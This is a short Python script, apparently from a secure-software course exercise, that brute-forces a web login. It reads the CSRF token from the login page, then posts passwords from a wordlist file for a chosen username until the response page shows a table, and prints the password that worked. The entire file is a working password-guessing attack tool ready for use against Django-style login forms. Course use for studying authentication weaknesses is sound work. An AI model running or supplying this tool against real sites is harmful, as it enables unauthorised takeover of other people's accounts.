# Using code from Securing Software Part IV exercise 19 as a base

import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.find_all('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return len(soup.find_all('table')) > 0


def test_password(address, username, candidates):
	session = requests.Session()
	res = session.get(
		url=address
	)
	token = extract_token(res)

	for candidate in candidates:
		login_data = {
			"csrfmiddlewaretoken": token,
			"username": username,
			"password": candidate
		}
		res = session.post(
			url=address,
			data = login_data
		)
		if isloggedin(res):
			return candidate
	return None


def main(argv):
	address = sys.argv[1]
	username = sys.argv[2]
	fname = sys.argv[3]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, username, candidates))


if __name__ == "__main__": 
	if len(sys.argv) != 4:
		print('usage: python %s address username filename' % sys.argv[0])
	else:
		main(sys.argv)
